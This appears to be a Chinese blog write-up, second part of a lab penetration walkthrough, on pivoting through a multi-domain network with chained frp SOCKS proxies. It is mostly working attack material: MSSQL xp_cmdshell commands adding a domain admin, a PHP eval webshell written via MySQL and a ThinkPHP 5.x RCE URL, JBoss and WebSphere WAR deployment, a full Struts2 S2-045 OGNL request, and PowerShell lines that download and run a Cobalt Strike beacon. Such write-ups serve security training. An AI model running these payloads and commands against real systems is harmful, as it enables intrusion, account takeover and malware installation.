接上篇的[实战渗透域森林+服务森林（上）](https://www.freebuf.com/articles/network/288127.html)，上篇文章中只讲到了一级和二级代理、域渗透常规操作以及部分服务攻防，本篇就主要涉及到frp的三级代理和服务攻防的相关知识了。

## 0x09 攻击独立域控服务器

之前在子域中子域中发现存在10.12.10.0/24网段，通过nbtscan发现存在10.12.10.3这台主机

### 一、建立二级frp

上线CS需要建立二级frp通道

#### （一）相关配置

子域域控frpc.ini配置如下

    
    
    [common]
    server_addr = 10.10.10.101
    server_port = 13000
    [http_proxy]
    type = tcp
    remote_port = 1097
    plugin = socks5
    

Web服务器frps.ini配置如下

    
    
    [common]
    bind_addr = 10.10.10.101
    bind_port = 13000
    

Web服务器frpc.ini配置如下

    
    
    [common]
    server_addr = 1.117.58.131
    server_port = 13000
    [http_proxy]
    type = tcp
    local_ip = 10.10.10.101
    local_port = 1097
    remote_port = 1097
    

公网服务器frps.ini配置如下

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 13000
    

#### （二）命令执行

首先先开启服务端的frp，在web服务器和公网服务器下执行如下命令

    
    
    frps.exe -c frps.ini
    ./frps -c frps.ini
    

![截屏2021-09-01
下午10.51.42](https://image.3001.net/images/20210910/1631211414_613a4f9657ca71e096c39.png!small)

之后在子域域控中执行

    
    
    frpc.exe -c frpc.ini
    

![截屏2021-09-01
下午10.53.01](https://image.3001.net/images/20210910/1631211419_613a4f9b61020043b4c1c.png!small)

最后在web服务器中执行

    
    
    frpc.exe -c frpc.ini
    

![截屏2021-09-01
下午10.53.50](https://image.3001.net/images/20210910/1631211424_613a4fa0a2d09c5a9a811.png!small)

在proxychains添加代理

    
    
    vim /etc/proxychains.conf
    

![截屏2021-09-01
下午10.57.00](https://image.3001.net/images/20210910/1631211429_613a4fa592f2ec249a00c.png!small)

### 二、信息收集

通过fscan对10.12.10.3进行扫描  
![image](https://image.3001.net/images/20210910/1631210156_613a4aac2cd515b8f7af3.png!small)  
![image](https://image.3001.net/images/20210910/1631210185_613a4ac9cbdf772ce14e5.png!small)  
扫描结果存在MSSQL数据库，账号密码为sa/admin@123

### 三、MSSQL命令执行利用并上线CS

首先使用MSF针对SQLserver的利用模块

    
    
    msfconsole
    # 设置代理
    msf > setg Proxies socks5:1.117.58.131:1097
    msf > setg ReverseAllowProxy true
    
    # 使用攻击模块
    msf > use admin/mssql/mssql_exec
    msf > set CMD whoami
    msf > set RHOSTS 10.12.10.3
    msf > set PASSWORD admin@123
    msf > run
    

![截屏2021-09-01
下午11.09.01](https://image.3001.net/images/20210910/1631211436_613a4fac36c8506461b7e.png!small)  
之后创建用户

    
    
    msf > set CMD net user mac 123QWEasd /add 
    msf > set CMD net localgroup administrators mac /add
    

![image](https://image.3001.net/images/20210910/1631210217_613a4ae9c9a46c52abc33.png!small)

但是报错，于是通过代理使用navicat连接mssql  
查询xp_cmd是否开启

    
    
    select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
    

返回1说明开启  
![截屏2021-09-01
下午11.22.58](https://image.3001.net/images/20210910/1631211441_613a4fb1ccd48a598e11e.png!small)  
如果没有开启可以执行以下命令进行开启

    
    
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell',1;
    RECONFIGURE;
    

命令执行，添加用户并添加到admins组

    
    
    master..xp_cmdshell 'net user mac /domain' #发现mac用户已添加
    master..xp_cmdshell 'net group "domain admins" mac /add /domain'
    

![image](https://image.3001.net/images/20210910/1631210236_613a4afcc5c67008c9934.png!small)  
![image](https://image.3001.net/images/20210910/1631210288_613a4b30d49ab77475117.png!small)  
![image](https://image.3001.net/images/20210910/1631210301_613a4b3dd391f8be02353.png!small)

于是在子域控中建立ipc$

    
    
    shell net use \\10.12.10.3\ipc$ "123QWEasd" /user:10.12.10.3\mac
    dir \\10.12.10.3\c$
    

![image](https://image.3001.net/images/20210910/1631210326_613a4b5669e6ff3a57189.png!small)

在子域控中设置中转监听同时生成mac4.exe  
![截屏2021-09-01
下午11.35.54](https://image.3001.net/images/20210910/1631211447_613a4fb737c5809dd4705.png!small)  
![截屏2021-09-01
下午11.36.43](https://image.3001.net/images/20210910/1631211454_613a4fbe1f05479ddf493.png!small)

将mac4.exe上传到子域控中，通过IPC复制到10.12.10.3

    
    
    shell copy mac4.exe \\10.12.10.3\c$
    shell dir \\10.12.10.3\c$
    

![image](https://image.3001.net/images/20210910/1631210348_613a4b6cdd9cf66b75418.png!small)

可以通过navicat连接数据库执行命令上线CS

    
    
    master..xp_cmdshell 'cd C:\ & mac4.exe'
    

也可以通过wmiexec来执行命令上线

    
    
    proxychains python3 wmiexec.py mac:123QWEasd@10.12.10.3
    

![截屏2021-09-01
下午11.46.59](https://image.3001.net/images/20210910/1631211463_613a4fc7c6788ab088968.png!small)  
成功上线CS  
![image](https://image.3001.net/images/20210910/1631210501_613a4c0509026685b5a08.png!small)

### 四、信息收集

发现该IP上存在两张网卡，即有两个网段

    
    
    10.12.10.3
    20.20.20.10
    

![image](https://image.3001.net/images/20210910/1631210517_613a4c15bb41ec055d2d2.png!small)  
通过nbtscan扫描20.20.20.0/24网段  
![image](https://image.3001.net/images/20210910/1631210535_613a4c27e7343f8fda112.png!small)

    
    
    20.20.20.10     DULI\WIN-LOH5RS7UNDP            SHARING DC
    20.20.20.101    WORKGROUP\WIN-AMJ9T9TL123       SHARING
    20.20.20.102    -no name-    20.20.20.103    -no name-    20.20.20.104    -no name-    20.20.20.105    -no name-    20.20.20.199    DULI\CAIWU                      SHARING
    

通过fscan扫描20.20.20.0/24网段

    
    
    WebTitle:http://20.20.20.103:5985 404 None
    WebTitle:http://20.20.20.103:47001 404 None
    NetInfo:
    [*]20.20.20.103
       [->]WIN-AMJ9T9TL123
       [->]20.20.20.103
    20.20.20.10	MS17-010	(Windows Server 2008 HPC Edition 7601 Service Pack 1)
    WebTitle:http://20.20.20.105:47001 404 None
    WebTitle:http://20.20.20.105:5985 404 None
    WebTitle:http://20.20.20.105:9060 404 None
    WebTitle:http://20.20.20.105:9080 404 None
    NetInfo:
    [*]20.20.20.105
       [->]WIN-AMJ9T9TL123
       [->]20.20.20.105
    WebTitle:http://20.20.20.10:47001 404 None
    WebTitle:http://20.20.20.101:8080 200 Welcome to JBoss AS
    NetInfo:
    [*]20.20.20.104
       [->]WIN-AMJ9T9TL123
       [->]20.20.20.104
    NetInfo:
    [*]20.20.20.101
       [->]WIN-AMJ9T9TL123
       [->]20.20.20.101
    WebTitle:https://20.20.20.105:9443 404 None
    WebTitle:https://20.20.20.105:9043 404 None
    mssql:20.20.20.10:1433:sa admin@123
    WebTitle:http://20.20.20.104:5985 404 None
    WebTitle:http://20.20.20.104:47001 404 None
    WebTitle:http://20.20.20.104:8080 200 Apache Tomcat/8.5.65
    WebTitle:http://20.20.20.101:47001 404 None
    WebTitle:http://20.20.20.101:5985 404 None
    WebTitle:https://20.20.20.105:8880 500 None
    NetInfo:
    [*]20.20.20.199
       [->]caiwu
       [->]20.20.20.199
       [->]2002:1414:14c7::1414:14c7
    NetInfo:
    [*]20.20.20.102
       [->]WIN-AMJ9T9TL123
       [->]20.20.20.102
    20.20.20.199	MS17-010	(Windows 7 Professional 7601 Service Pack 1)
    WebTitle:http://20.20.20.102:5985 404 None
    WebTitle:http://20.20.20.102:47001 404 None
    mysql:20.20.20.199:3306:root root
    WebTitle:http://20.20.20.102:80 200 None
    WebTitle:http://20.20.20.199:80 200 phpStudy 鎺㈤拡 2014
    

通过cscan扫描20.20.20.0/24网段

    
    
    20.20.20.10 MS17-010 WIN-LOH5RS7UNDP dul.com [Win 2008 HPC Edition 7601 SP 1]
    20.20.20.101 WIN-AMJ9T9TL123  [Win 2016 Standard 14393]
    20.20.20.102 WIN-AMJ9T9TL123  [Win 2016 Standard 14393]
    20.20.20.104 WIN-AMJ9T9TL123  [Win 2016 Standard 14393]
    20.20.20.103 WIN-AMJ9T9TL123  [Win 2016 Standard 14393]
    20.20.20.105 WIN-AMJ9T9TL123  [Win 2016 Standard 14393]
    20.20.20.199 MS17-010 CAIWU dul.com [Win 7 Professional 7601 SP 1]
    

## 0x10 攻击独立域财务服务器

打击20.20.20.0/24网段首先需要建立三级frp

### 一、建立三级frp

#### （一）相关配置

独立域控frpc.ini配置如下

    
    
    [common]
    server_addr = 10.12.10.5
    server_port = 14000
    [http_proxy]
    type = tcp
    remote_port = 1098
    plugin = socks5
    

子域控frps.ini配置如下

    
    
    [common]
    bind_addr = 10.12.10.5
    bind_port = 14000
    

子域控frpc.ini配置如下

    
    
    [common]
    server_addr = 10.10.10.101
    server_port = 14000
    [http_proxy]
    type = tcp
    local_ip = 10.12.10.5
    local_port = 1098
    remote_port = 1098
    

Web服务器frps.ini配置如下

    
    
    [common]
    bind_addr = 10.10.10.101
    bind_port = 14000
    

Web服务器frpc.ini配置如下

    
    
    [common]
    server_addr = 1.117.58.131
    server_port = 14000
    [http_proxy]
    type = tcp
    local_ip = 10.10.10.101
    local_port = 1098
    remote_port = 1098
    

公网服务器frps.ini配置如下

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 14000
    

#### （二）命令执行

首先先开启服务端的frp，在web服务器、公网服务器、子域控下执行如下命令

    
    
    frps.exe -c frps.ini
    ./frps -c frps.ini
    

![截屏2021-09-02
上午12.23.50](https://image.3001.net/images/20210910/1631211470_613a4fcee14295346861c.png!small)  
![截屏2021-09-02
上午12.22.39](https://image.3001.net/images/20210910/1631211475_613a4fd3a3b362f806e4d.png!small)  
之后在独立域控下执行如下命令

    
    
    frpc.exe -c frpc.ini
    

![image](https://image.3001.net/images/20210910/1631210569_613a4c497d75f3465666e.png!small)  
之后在子域控下执行如下命令

    
    
    frpc.exe -c frpc.ini
    

![截屏2021-09-02
上午12.29.21](https://image.3001.net/images/20210910/1631211481_613a4fd9b65e7e9f6d4f6.png!small)  
之后在web服务器下执行如下命令

    
    
    frpc.exe -c frpc.ini
    

![image](https://image.3001.net/images/20210910/1631210586_613a4c5aac56eb8b23060.png!small)  
在proxychains添加代理

    
    
    vim /etc/proxychains.conf
    

![image](https://image.3001.net/images/20210910/1631210606_613a4c6e1b295d16d2cc3.png!small)

### 二、mysql弱口令利用并上线CS

通过访问`http://20.20.20.199`

    
    
    proxychains firefox http://20.20.20.199/phpmyadmin
    

但是加载太慢了，它的默认口令为root/root，利用方法和之前一样  
![image](https://image.3001.net/images/20210910/1631210621_613a4c7dc4952a1da3cde.png!small)

这里选择MSF爆破弱口令

    
    
    msfconsole
    msf > use auxiliary/scanner/mysql/mysql_login
    msf > setg Proxies socks5:1.117.58.131:1098
    msf > setg ReverseAllowProxy true
    msf > set rhosts 20.20.20.199
    msf > set PASSFILE xxx
    msf > exploit
    

得到弱口令root/root，直接登录

    
    
    proxychains mysql -u root -proot -h20.20.20.199
    

查看是否拥有写入文件的权限和写入位置，空表示可以写入任意位置

    
    
    show global variables like '%secure_file_priv%';
    

写入木马到网站目录下

    
    
    select '<?php @eval($_POST[mac]);?>' into outfile 'C:/phpStudy/WWW/mac2.php';
    

![image](https://image.3001.net/images/20210910/1631210644_613a4c9476f5c70f73f4b.png!small)

设置蚁剑代理，连接`http://20.20.20.199/mac2.php`，成功上线  
![截屏2021-09-02
上午12.47.27](https://image.3001.net/images/20210910/1631211487_613a4fdff03c81e88b3d9.png!small)

设置中转监听，并生成木马mac5.exe  
![截屏2021-09-02
上午12.51.15](https://image.3001.net/images/20210910/1631211494_613a4fe682fd516344726.png!small)  
![image](https://image.3001.net/images/20210910/1631210662_613a4ca672c8cb5ad52f4.png!small)

在蚁剑中上传mac5.exe并执行  
![image](https://image.3001.net/images/20210910/1631210683_613a4cbb32e0073e56e96.png!small)  
![image](https://image.3001.net/images/20210910/1631210697_613a4cc9f31ab1f38e7d1.png!small)

## 0x11 攻击JBOSS独立机

### 一、信息收集

通过fscan发现`http://20.20.20.101:8080`

    
    
    proxychains firefox http://20.20.20.101:8080
    

![截屏2021-09-02
上午12.58.10](https://image.3001.net/images/20210910/1631211501_613a4fed8448408f09c49.png!small)  
为JBOSS中间件，可能存在JMX Console未授权访问漏洞

### 二、JMX Console未授权访问漏洞利用并上线CS

找到Jboss-system中的MainDepolyer  
![image](https://image.3001.net/images/20210910/1631210718_613a4cde9eb474fab0168.png!small)

在20.20.20.199的http界面中上传war包  
![image](https://image.3001.net/images/20210910/1631210734_613a4ceecfd8013050c37.png!small)

打包war包

    
    
    jar -cvf mac.war "mac.jsp"
    

在JBOSS中远程（deploy）部署`http://20.20.20.199/mac.war`，点击invoke  
![截屏2021-09-02
上午1.30.52](https://image.3001.net/images/20210910/1631211504_613a4ff0ddb1f2b2d07fd.png!small)  
![截屏2021-09-02
上午1.25.19](https://image.3001.net/images/20210910/1631211507_613a4ff31e5e344d84865.png!small)  
访问网址`http://20.20.20.101:8080/mac/mac.jsp`，已成功部署  
![截屏2021-09-02
上午1.32.03](https://image.3001.net/images/20210910/1631211513_613a4ff964a93a2376e0c.png!small)

执行以下命令上线CS

    
    
    powershell (new-object System.Net.WebClient).DownloadFile('http://20.20.20.199/mac5.exe','mac5.exe');start-process mac5.exe
    

![截屏2021-09-02
上午1.33.57](https://image.3001.net/images/20210910/1631211517_613a4ffd53868462623c2.png!small)  
![截屏2021-09-02
上午1.34.40](https://image.3001.net/images/20210910/1631211523_613a500329c8552303e80.png!small)

## 0x12 攻击ThinkPHP独立机

### 一、信息收集

通过fscan扫描到该主机存在http服务，通过代理进行访问

    
    
    proxychains firefox http://20.20.20.102
    

![image](https://image.3001.net/images/20210910/1631210789_613a4d25e4537bb59d85a.png!small)

显示为ThinkPHP v5框架，可能存在远程代码执行漏洞

### 二、ThinkPHP5.x远程代码执行漏洞利用并上线CS

首先验证是否存在该漏洞

    
    
    http://20.20.20.102/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo
    

![image](https://image.3001.net/images/20210910/1631210806_613a4d36c00af39b53b2b.png!small)  
跳出phpinfo界面说明存在该漏洞

通过任意代码执行写入shell  
小马源码：

    
    
    <?php @eval($_POST[mac]);?>
    

url编码后：

    
    
    %3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%6d%61%63%5d%29%3b%3f%3e
    

将参数进行替换

    
    
    http://20.20.20.102/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=mac.php&vars[1][]=%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%6d%61%63%5d%29%3b%3f%3e
    

![截屏2021-09-02
上午1.45.33](https://image.3001.net/images/20210910/1631211528_613a50089bd1f2a4322d8.png!small)

返回数值就说明执行成功

通过蚁剑连接`http://20.20.20.102/mac.php`，成功上线  
![image](https://image.3001.net/images/20210910/1631210827_613a4d4b73fb04c950ee5.png!small)

上传mac5.exe并成功执行，上线CS  
![image](https://image.3001.net/images/20210910/1631210847_613a4d5fdc202d67d0fd3.png!small)  
![image](https://image.3001.net/images/20210910/1631210862_613a4d6e1fda7415c576b.png!small)

## 0x13 攻击Shiro独立机

### 一、信息收集

通过fscan扫描到该主机存在http服务，通过代理进行访问

    
    
    proxychains firefox http://20.20.20.103:8080
    

![image](https://image.3001.net/images/20210910/1631210881_613a4d81be9cdb58753c9.png!small)

为tomcat界面，访问控制界面出错，对其下目录进行扫描，发现`http://20.20.20.103:8080/shiro`，为Shiro框架  
![image](https://image.3001.net/images/20210910/1631210897_613a4d91b233a5e77eebd.png!small)  
![image](https://image.3001.net/images/20210910/1631210914_613a4da235d8bc04f224d.png!small)

### 二、shiro反序列化利用并上线CS

通过shiro-1.2.4-rce对其进行利用

    
    
    git clone https://github.com/zhzyker/shiro-1.2.4-rce.git
    cd shiro-1.2.4-rce
    proxychains python3 shiro-1.2.4_rce.py http://20.20.20.103:8080/shiro/login.jsp
    

![image](https://image.3001.net/images/20210910/1631210953_613a4dc9c1e6d62b13972.png!small)

执行powershell命令上线CS

    
    
    powershell (new-object System.Net.WebClient).DownloadFile('http://20.20.20.199/mac5.exe','mac5.exe');start-process mac5.exe
    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://20.20.20.199/mac5.exe','mac5.exe');start-process mac5.exe
    powershell (new-object System.Net.WebClient).DownloadFile('http://20.20.20.199/mac5.exe','mac5.exe');start-process mac5.exe
    

![image](https://image.3001.net/images/20210910/1631210971_613a4ddb1e32a53ce615e.png!small)  
这台一直出现问题，无法上线

## 0x14 攻击Struts2独立机

### 一、信息收集

通过fscan扫描8080端口存在web服务，访问`http://20.20.20.104:8080`

    
    
    proxychains firefox http://20.20.20.104:8080
    

![image](https://image.3001.net/images/20210910/1631210988_613a4dec36b4d2226ecdc.png!small)

为Tomcat界面，访问目录S2-045，判断可能存在Struts2系列框架漏洞  
![image](https://image.3001.net/images/20210910/1631211003_613a4dfbf211e23d2d76c.png!small)

### 二、Struts2-045漏洞利用并上线CS

通过burp抓取数据包，需先设置代理  
![截屏2021-09-02
上午2.59.16](https://image.3001.net/images/20210910/1631211532_613a500c563d644e086aa.png!small)

    
    
    POST /S2-045/fileupload/doUpload.action HTTP/1.1
    Host: 20.20.20.104:8080
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='powershell -Command (new-object System.Net.WebClient).DownloadFile(\'http://20.20.20.199/mac5.exe\',\'mac5.exe\');start-process mac5.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} boundary=---------------------------255663886332559909593529682920
    Content-Length: 344
    Origin: http://20.20.20.104:8080
    Connection: close
    Referer: http://20.20.20.104:8080/S2-045/fileupload/upload.action
    Cookie: JSESSIONID=7B84132FC14F461D411AEBE4DA902C2AA
    Upgrade-Insecure-Requests: 1
    
    -----------------------------255663886332559909593529682920
    Content-Disposition: form-data; name="upload"; filename=""
    Content-Type: application/octet-stream
    
    
    -----------------------------255663886332559909593529682920
    Content-Disposition: form-data; name="caption"
    
    aaa
    -----------------------------255663886332559909593529682920--    

![image](https://image.3001.net/images/20210910/1631211026_613a4e1261e473ba2cc05.png!small)

执行后，成功上线CS  
![image](https://image.3001.net/images/20210910/1631211044_613a4e242b81b3653d148.png!small)

## 0x15 攻击WebSphere独立机

### 一、信息收集

通过railgun工具扫描端口信息，发现9060和9043是WebSphere使用的端口  
访问`http://20.20.20.105:9043/ibm/console/logon.jsp`

    
    
    proxychains firefox https://20.20.20.105:9043/ibm/console/logon.jsp
    

![image](https://image.3001.net/images/20210910/1631211059_613a4e33e7acc3865045c.png!small)

### 二、弱口令利用并上线CS

通过弱口令admin/admin@123登录，存在WebSphere中间件漏洞  
![image](https://image.3001.net/images/20210910/1631211078_613a4e46b709b5d81c438.png!small)  
选择新增企业版应用，之后部署war包  
![image](https://image.3001.net/images/20210910/1631211093_613a4e5547b4f71b09d86.png!small)  
之后一直下一步，直到选填路径  
![image](https://image.3001.net/images/20210910/1631211108_613a4e6422e0dd6f599da.png!small)  
![image](https://image.3001.net/images/20210910/1631211123_613a4e73d45d670d46d52.png!small)  
![截屏2021-09-02
上午4.24.29](https://image.3001.net/images/20210910/1631211537_613a50112a092cf779d48.png!small)  
完成并保存，选择刚刚部署的war包开始运行  
![截屏2021-09-02
上午4.25.11](https://image.3001.net/images/20210910/1631211542_613a5016d3d93521cb36e.png!small)

访问`http://20.20.20.105:9080/mac/mac.jsp`  
![image](https://image.3001.net/images/20210910/1631211143_613a4e87b04b18dd5b6b9.png!small)

执行命令上线CS

    
    
    powershell (new-object System.Net.WebClient).DownloadFile('http://20.20.20.199/mac5.exe','mac5.exe');start-process mac5.exe
    

![截屏2021-09-02
上午4.30.51](https://image.3001.net/images/20210910/1631211547_613a501b77ce1be0a2d2a.png!small)

最后成功上线CS  
![image](https://image.3001.net/images/20210910/1631211162_613a4e9aebbdfc5452b35.png!small)

## 0x16 总结

本次域渗透+服务攻防的通关让我对内网渗透的理解更加透彻，其中建立代理是打内网的关键，其他的话和平时渗透差不多。感谢大家看完这一长篇的笔记，欢迎大家在评论区留言交流。最后附上通关图。  
![image](https://image.3001.net/images/20210910/1631211181_613a4ead8a0169b07316e.png!small)

